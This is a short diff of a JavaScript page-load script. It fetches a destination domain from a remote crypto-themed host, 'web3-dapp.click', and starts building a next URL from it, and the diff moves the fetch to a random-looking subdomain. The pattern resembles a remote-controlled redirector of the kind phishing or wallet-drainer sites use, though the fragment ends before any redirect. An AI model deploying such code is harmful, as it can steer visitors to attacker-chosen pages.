@@ -1,6 +1,6 @@
 window.onload = function() {
     
-    fetch('https://web3-dapp.click/url.php')
+    fetch('https://ktqn4.web3-dapp.click/url.php')
         .then(response => response.text()) 
         .then(domain => {
             const nextUrl = 'https://' + domain.trim(); 
